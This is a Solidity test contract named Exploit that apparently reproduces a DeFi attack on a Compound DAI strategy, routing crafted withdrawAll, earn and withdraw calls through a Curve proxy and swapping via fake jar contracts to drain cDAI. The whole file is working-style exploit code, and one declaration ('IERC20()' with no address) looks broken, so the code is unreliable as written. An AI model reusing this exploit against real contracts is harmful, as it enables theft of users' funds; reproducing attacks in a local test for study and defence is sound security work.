// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./forgetest.sol";
import {FakeJar} from "./FakeJar.sol";
import {FakeUnderlying} from "./FakeUnderlying.sol";
import {IController, ICurveProxy, IStrategy} from "./ILogic.sol";
import "./Helper.sol";

contract Exploit is Test {
    IController constant strategyCompoundDaiV2 =
        IController(0x24B7a1fcd8E6c1eB19Dc34b381422a8E584a1C83);

    ICurveProxy constant curveProxy =
        ICurveProxy(0xc5716F50119af43bcC421054D691d65A12c4B229);

    IERC20 constant DAI = IERC20(0x62dBcc0D1F3B3cD5aa4fdfd0b092C169bFf7Ab0E);

    IERC20 constant cDAI = IERC20(0x7D632f8ABBe8bF532650b69316B1E9c8567B6c74);

    IERC20 constant pDAI = IERC20();

    address constant strategy = 0xbd46A6Ff54Ec4E4c26A5d83AF126455BFAF285FD;

    IStrategy constant strategyContract = IStrategy(strategy);

    function exploit() external {
        uint256 _fromJarAmount = strategyContract.balanceOfPool();
        console.log("unleveraged DAI", _fromJarAmount);

        address[] memory target = new address[](5);
        bytes[] memory data = new bytes[](5);

        for (uint8 i = 0; i < 5; i++) {
            target[i] = address(curveProxy);
        }

        data[0] = abi.encodeWithSelector(
            curveProxy.add_liquidity.selector,
            strategy,
            bytes4(keccak256(bytes("withdrawAll()"))),
            1,
            0,
            address(cDAI)
        );

        data[1] = abi.encodeWithSelector(
            curveProxy.add_liquidity.selector,
            address(pDAI),
            bytes4(keccak256(bytes("earn()"))),
            1,
            0,
            address(cDAI)
        );
        data[2] = abi.encodeWithSelector(
            curveProxy.add_liquidity.selector,
            address(pDAI),
            bytes4(keccak256(bytes("earn()"))),
            1,
            0,
            address(cDAI)
        );
        data[3] = abi.encodeWithSelector(
            curveProxy.add_liquidity.selector,
            address(pDAI),
            bytes4(keccak256(bytes("earn()"))),
            1,
            0,
            address(cDAI)
        );

        data[4] = abi.encodeWithSelector(
            curveProxy.add_liquidity.selector,
            strategy,
            bytes4(keccak256(bytes("withdraw(address)"))),
            1,
            0,
            address(new FakeUnderlying(address(cDAI)))
        );

        console.log("DAI balance on pDAI", DAI.balanceOf(address(pDAI)));

        strategyCompoundDaiV2.swapExactJarForJar(
            address(new FakeJar(cDAI)),
            address(new FakeJar(cDAI)),
            0,
            0,
            target,
            data
        );

        console.log("cDAI after swapExactJarForJar", cDAI.balanceOf(address(1337)));
    }
}
